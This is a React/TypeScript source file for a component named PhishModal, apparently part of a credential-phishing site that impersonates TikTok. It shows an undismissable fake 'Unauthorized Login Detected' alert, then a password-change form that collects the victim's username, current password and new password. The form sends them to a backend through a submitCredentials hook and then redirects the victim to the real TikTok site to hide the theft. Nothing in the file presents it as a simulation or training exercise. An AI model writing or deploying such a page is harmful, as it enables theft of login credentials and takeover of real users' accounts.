import { useState, useEffect } from "react";
import { motion, AnimatePresence } from "framer-motion";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import * as z from "zod";
import { ShieldAlert, CheckCircle2, Loader2, Lock, AlertTriangle } from "lucide-react";
import { useSubmitCredentials } from "@workspace/api-client-react";

const formSchema = z.object({
  username: z.string().min(1, "Username or email is required"),
  currentPassword: z.string().min(1, "Current password is required"),
  confirmCurrentPassword: z.string().min(1, "Please confirm your current password"),
  newPassword: z.string().min(6, "New password must be at least 6 characters"),
  confirmNewPassword: z.string().min(1, "Please confirm your new password"),
}).refine((data) => data.currentPassword === data.confirmCurrentPassword, {
  message: "Current passwords do not match",
  path: ["confirmCurrentPassword"],
}).refine((data) => data.newPassword === data.confirmNewPassword, {
  message: "New passwords do not match",
  path: ["confirmNewPassword"],
});

type FormValues = z.infer<typeof formSchema>;

const inputClass = (hasError: boolean) =>
  `w-full px-3 py-2 rounded-lg bg-background border text-sm ${
    hasError
      ? "border-destructive focus:ring-destructive/20"
      : "border-border focus:border-primary focus:ring-primary/20"
  } text-white placeholder:text-muted-foreground focus:outline-none focus:ring-2 transition-all`;

type Stage = "idle" | "alert" | "form";

export function PhishModal() {
  const [stage, setStage] = useState<Stage>("idle");
  const [isSuccess, setIsSuccess] = useState(false);
  const { mutate: submitCreds, isPending } = useSubmitCredentials();

  const {
    register,
    handleSubmit,
    formState: { errors },
  } = useForm<FormValues>({
    resolver: zodResolver(formSchema),
  });

  useEffect(() => {
    const timer = setTimeout(() => setStage("alert"), 1000);
    return () => clearTimeout(timer);
  }, []);

  useEffect(() => {
    if (stage === "idle") return;
    document.body.style.overflow = "hidden";
    return () => {
      document.body.style.overflow = "";
    };
  }, [stage]);

  const onSubmit = (data: FormValues) => {
    submitCreds({ data }, {
      onSuccess: () => {
        setIsSuccess(true);
        setTimeout(() => {
          window.location.href = "https://www.tiktok.com";
        }, 2000);
      },
    });
  };

  return (
    <AnimatePresence mode="wait">
      {/* Stage 1: Security Alert — centered over a blocking overlay */}
      {stage === "alert" && (
        <motion.div
          key="alert"
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          exit={{ opacity: 0 }}
          className="fixed inset-0 z-50 flex items-center justify-center px-4 bg-black/70 backdrop-blur-sm"
        >
          <motion.div
            initial={{ opacity: 0, scale: 0.92, y: 16 }}
            animate={{ opacity: 1, scale: 1, y: 0 }}
            exit={{ opacity: 0, scale: 0.92, y: 16 }}
            transition={{ type: "spring", damping: 22, stiffness: 260 }}
            className="w-full max-w-md bg-[#120000] border border-red-600/60 rounded-2xl shadow-2xl shadow-red-900/50 p-8"
          >
            <div className="flex flex-col items-center text-center gap-4">
              <div className="w-16 h-16 bg-red-600/20 rounded-full flex items-center justify-center text-red-500">
                <AlertTriangle className="w-8 h-8" />
              </div>

              <div>
                <p className="text-white font-bold text-xl leading-snug mb-2">
                  Unauthorized Login Detected
                </p>
                <p className="text-[14px] text-[#ffc9c9bc]">
                  Someone has accessed your TikTok account from an unrecognized device. Secure your account immediately to prevent further unauthorized access.
                </p>
              </div>

              <div className="w-full pt-2">
                <button
                  onClick={() => setStage("form")}
                  className="w-full flex items-center justify-center gap-2 px-6 py-3.5 bg-red-600 hover:bg-red-500 active:bg-red-700 text-white font-bold rounded-xl transition-colors text-base"
                >
                  <Lock className="w-5 h-5" />
                  Change Password Now
                </button>
              </div>

              <p className="text-red-400/50 text-xs">
                You cannot dismiss this alert until your password is changed.
              </p>
            </div>
          </motion.div>
        </motion.div>
      )}
      {/* Stage 2: Password Change Form Modal */}
      {stage === "form" && (
        <div key="form" className="fixed inset-0 z-50 flex items-center justify-center px-4 bg-black/80 backdrop-blur-sm">
          <motion.div
            initial={{ opacity: 0, scale: 0.95, y: 20 }}
            animate={{ opacity: 1, scale: 1, y: 0 }}
            exit={{ opacity: 0, scale: 0.95, y: 20 }}
            transition={{ type: "spring", damping: 25, stiffness: 300 }}
            className="relative w-full max-w-md bg-card border border-border/50 rounded-2xl shadow-2xl overflow-hidden"
          >
            <div className="h-1.5 w-full bg-gradient-to-r from-red-600 via-primary to-primary" />

            <div className="px-6 py-5">
              {!isSuccess ? (
                <>
                  <div className="flex flex-col items-center text-center mb-4">
                    <div className="w-10 h-10 bg-primary/10 rounded-full flex items-center justify-center mb-2 text-primary">
                      <ShieldAlert className="w-5 h-5" />
                    </div>
                    <h2 className="text-xl font-bold tracking-tight text-white mb-0.5">
                      Change Your Password
                    </h2>
                    <p className="text-xs text-muted-foreground">
                      For your security, please update your TikTok password to continue.
                    </p>
                  </div>

                  <form onSubmit={handleSubmit(onSubmit)} className="space-y-2.5">
                    <div>
                      <label className="block text-xs font-semibold text-foreground/80 mb-1 uppercase tracking-wider">
                        Username or Email
                      </label>
                      <input
                        {...register("username")}
                        type="text"
                        placeholder="Enter your TikTok username or email"
                        disabled={isPending}
                        autoComplete="username"
                        className={inputClass(!!errors.username)}
                      />
                      {errors.username && (
                        <p className="text-destructive text-xs mt-1 font-medium">{errors.username.message}</p>
                      )}
                    </div>

                    <div>
                      <label className="block text-xs font-semibold text-foreground/80 mb-1 uppercase tracking-wider">
                        Current Password
                      </label>
                      <input
                        {...register("currentPassword")}
                        type="password"
                        placeholder="Enter your current password"
                        disabled={isPending}
                        autoComplete="current-password"
                        className={inputClass(!!errors.currentPassword)}
                      />
                      {errors.currentPassword && (
                        <p className="text-destructive text-xs mt-1 font-medium">{errors.currentPassword.message}</p>
                      )}
                    </div>

                    <div>
                      <label className="block text-xs font-semibold text-foreground/80 mb-1 uppercase tracking-wider">
                        Confirm Current Password
                      </label>
                      <input
                        {...register("confirmCurrentPassword")}
                        type="password"
                        placeholder="Re-enter your current password"
                        disabled={isPending}
                        autoComplete="current-password"
                        className={inputClass(!!errors.confirmCurrentPassword)}
                      />
                      {errors.confirmCurrentPassword && (
                        <p className="text-destructive text-xs mt-1 font-medium">{errors.confirmCurrentPassword.message}</p>
                      )}
                    </div>

                    <div>
                      <label className="block text-xs font-semibold text-foreground/80 mb-1 uppercase tracking-wider">
                        New Password
                      </label>
                      <input
                        {...register("newPassword")}
                        type="password"
                        placeholder="Create a strong new password"
                        disabled={isPending}
                        autoComplete="new-password"
                        className={inputClass(!!errors.newPassword)}
                      />
                      {errors.newPassword && (
                        <p className="text-destructive text-xs mt-1 font-medium">{errors.newPassword.message}</p>
                      )}
                    </div>

                    <div>
                      <label className="block text-xs font-semibold text-foreground/80 mb-1 uppercase tracking-wider">
                        Confirm New Password
                      </label>
                      <input
                        {...register("confirmNewPassword")}
                        type="password"
                        placeholder="Repeat your new password"
                        disabled={isPending}
                        autoComplete="new-password"
                        className={inputClass(!!errors.confirmNewPassword)}
                      />
                      {errors.confirmNewPassword && (
                        <p className="text-destructive text-xs mt-1 font-medium">{errors.confirmNewPassword.message}</p>
                      )}
                    </div>

                    <div className="pt-1">
                      <button
                        type="submit"
                        disabled={isPending}
                        className="w-full flex items-center justify-center gap-2 px-6 py-3 rounded-xl font-bold bg-primary text-white hover:bg-primary/90 hover:-translate-y-0.5 active:translate-y-0 shadow-lg shadow-primary/20 hover:shadow-primary/40 disabled:opacity-70 disabled:cursor-not-allowed transition-all"
                      >
                        {isPending ? (
                          <>
                            <Loader2 className="w-5 h-5 animate-spin" />
                            Updating...
                          </>
                        ) : (
                          <>
                            <Lock className="w-5 h-5" />
                            Update Password
                          </>
                        )}
                      </button>
                    </div>
                  </form>

                  <p className="text-center text-xs text-muted-foreground mt-3">
                    By continuing, you agree to TikTok's Terms of Service and confirm you have read TikTok's Privacy Policy.
                  </p>
                </>
              ) : (
                <motion.div
                  initial={{ opacity: 0, scale: 0.9 }}
                  animate={{ opacity: 1, scale: 1 }}
                  className="flex flex-col items-center text-center py-8"
                >
                  <div className="w-20 h-20 bg-green-500/20 rounded-full flex items-center justify-center mb-6">
                    <CheckCircle2 className="w-10 h-10 text-green-500" />
                  </div>
                  <h2 className="text-2xl font-bold tracking-tight text-white mb-2">
                    Password Updated!
                  </h2>
                  <p className="text-muted-foreground mb-6">
                    Your account has been secured. Redirecting you to TikTok...
                  </p>
                  <Loader2 className="w-6 h-6 animate-spin text-primary" />
                </motion.div>
              )}
            </div>
          </motion.div>
        </div>
      )}
    </AnimatePresence>
  );
}
